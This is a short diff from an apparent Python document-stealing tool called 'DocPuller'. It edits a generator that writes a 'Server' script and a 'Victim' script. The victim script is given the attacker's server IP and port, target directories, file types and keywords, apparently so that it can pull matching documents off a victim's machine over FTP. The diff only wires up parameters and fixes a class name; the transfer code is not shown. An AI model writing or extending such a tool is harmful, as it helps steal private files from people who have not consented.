@@ -25,14 +25,15 @@ if __name__ == '__main__':
         """
 
         else:
-            self.parms = f'{direcoties}, {file_type}, {keywords}, {date}, {server_ip}, {server_port}'
+            self.server_parms =rf'"{server_ip}", {server_port}, "c:\\"'
+            self.victim_parms = f'"{server_ip}", {server_port}, {direcoties}, {file_type}, {keywords}, {date}'
             self.SCRIPT1 = f"""
 
 from DocPullerScripts.DocPullerFTP.server import Server
 
 def main():
 
-    docPuller = Server({self.parms})
+    docPuller = Server({self.server_parms})
 
     docPuller.main()
 
@@ -48,7 +49,7 @@ from DocPullerScripts.DocPullerFTP.victim import Victim
 
 def main():
 
-    docPuller = DocPullerVictim({self.parms})
+    docPuller = Victim({self.victim_parms})
 
     docPuller.main()
 
